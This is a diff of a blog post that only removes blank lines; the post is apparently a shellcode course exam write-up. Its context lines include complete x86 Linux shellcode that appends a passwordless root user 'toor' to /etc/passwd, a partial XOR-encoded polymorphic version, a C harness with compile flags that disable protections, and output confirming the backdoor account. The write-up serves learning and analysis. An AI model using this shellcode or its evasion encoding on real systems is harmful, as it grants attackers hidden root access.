@@ -42,7 +42,6 @@ First, we need to analyze the original shellcode:
 echo -n "\xeb\x38\x5e\x31\xc0\x88\x46\x0b\x88\x46\x2b\xc6\x46\x2a\x0a\x8d\x5e\x0c\x89\x5e\x2c\x8d\x1e\x66\xb9\x42\x04\x66\xba\xa4\x01\xb0\x05\xcd\x80\x89\xc3\x31\xd2\x8b\x4e\x2c\xb2\x1f\xb0\x04\xcd\x80\xb0\x06\xcd\x80\xb0\x01\x31\xdb\xcd\x80\xe8\xc3\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x23\x74\x6f\x6f\x72\x3a\x3a\x30\x3a\x30\x3a\x74\x30\x30\x72\x3a\x2f\x72\x6f\x6f\x74\x3a\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x20\x23" > shellcode.bin
 
 ndisasm -b 32 -p intel shellcode.bin
-
 ```
 
 Follows the output of `ndisasm`:
@@ -95,7 +94,6 @@ Follows the output of `ndisasm`:
                             ;     - S_IRGRP
                             ;     - S_IROTH
 0000001B  66BAA401          mov dx,0x1a4
-
 ```
 
 I've learning something new while analyzing this shellcode: that permissions bits in the Linux kernel's source code are represented with the [octal numeral system](https://en.wikipedia.org/wiki/Octal).
@@ -110,7 +108,6 @@ Let's look at an example. If you were to check the values for a constant like `O
 
 #ifndef O_CREAT
 #define O_CREAT         00000100        /* not fcntl */
-
 ```
 
 Initially I though the number was simply a decimal one. If not, maybe a hexadecimal number. Well, turns out that it's actually an octal one.
@@ -125,7 +122,6 @@ Back to the shellcode: after the instructions above, the `open` syscall is calle
                             ; invoke syscall open()
 0000001F  B005              mov al,0x5
 00000021  CD80              int 0x80
-
 ```
 
 <figcaption class="figure-caption">Use the `open()` syscall to open the file `/etc/passwd`, with flags</figcaption>
@@ -167,7 +163,6 @@ Now that the file is opened, it's time to write the new entry:
 0000003F  2F                das
 ...       ...               ...
 00000069  2023              and [ebx],ah
-
 ```
 
 ## Polymorphic shellcode
@@ -265,7 +260,6 @@ CallRunShellcode:
 
     call RunShellcode
     EncodedStringBytes: db 0x5e,0x06,0x17,0x16,0x5e,0x13,0x02,0x06,0x02,0x14,0x07,0x75,0x05,0x0c,0x0c,0x07,0x4b,0x59,0x53,0x4f,0x41,0x59,0x17,0x45,0x41,0x11,0x59,0x5a,0x03,0x0c,0x0c,0x01,0x4b,0x4c,0x01,0x1c,0x1f,0x4c,0x01,0x14,0x02,0x0b,0x69,0x75
-
 ```
 
 The size of the resulting shellcode is `123 bytes`, which means `115%` compared to the original shellcode.
@@ -292,7 +286,6 @@ RunShellcode:
     mov cl, 11
     
     ; ...
-
 ```
 
 <figcaption class="figure-caption">The assembly code in between has been omitted for clarity, in order to show the `JMP-CALL-POP` technique</figcaption>
@@ -304,7 +297,6 @@ CallRunShellcode:
 
     call RunShellcode
     EncodedStringBytes: db 0x5e,0x06,0x17,0x16,0x5e,0x13,0x02,0x06,0x02,0x14,0x07,0x75,0x05,0x0c,0x0c,0x07,0x4b,0x59,0x53,0x4f,0x41,0x59,0x17,0x45,0x41,0x11,0x59,0x5a,0x03,0x0c,0x0c,0x01,0x4b,0x4c,0x01,0x1c,0x1f,0x4c,0x01,0x14,0x02,0x0b,0x69,0x75
-
 ```
 
 Compared to the original shellcode, I'm still using the the `JMP-CALL-POP` technique.
@@ -330,7 +322,6 @@ DecodeStringBytes:
 
     ; repeat 11 times, if ECX == 0 don't loop
     loop DecodeStringBytes
-
 ```
 
 The goal of the code above is to decode the encoded bytes, by `XOR`-ing one `DWORD` at a time with the key `0x75636371`.
@@ -374,7 +365,6 @@ OpenFile:
 
     ; call syscall 0x5: open()
     int 0x80
-
 ```
 
 The first instructions are used by the shellcode for retrieving the pointers to the following decoded strings:
@@ -417,7 +407,6 @@ AddMaliciousUser:
 
     ; call syscall write()
     int 0x80
-
 ```
 
 Starting from the top, instead of using `mov ebx, eax` I chose to use an instruction I've rarely used up until now: `XCHG`, which exchanges the contents of the two registers.
@@ -438,7 +427,6 @@ CloseFileHandle:
     ; call syscall close()
     mov al,0x6
     int 0x8
-
 ```
 
 It closes the file descriptor of the file `/etc/passwd`, opened before by means of the syscall `open()`.
@@ -453,7 +441,6 @@ Exit:
     ; call syscall exit() 
     inc eax
     int 0x80
-
 ```
 
 It terminates the execution.
@@ -478,14 +465,12 @@ main()
     int (*ret)() = (int(*)())code;
     ret();
 }
-
 ```
 
 To compile:
 
 ```bash
 gcc -fno-stack-protector -z execstack -o test_polymorphic_shellcode test_polymorphic_shellcode.c
-
 ```
 
 Once I've run it, I could see a new entry inside the file `/etc/passwd`:
@@ -505,6 +490,5 @@ rbct@slae:~/exam/assignment_6/2$ tail -n 3 /etc/passwd
 # toor::0:0:t00r:/root:/bin/bash
 
 rbct@slae:~/exam/assignment_6/2$ 
-
 ```
 
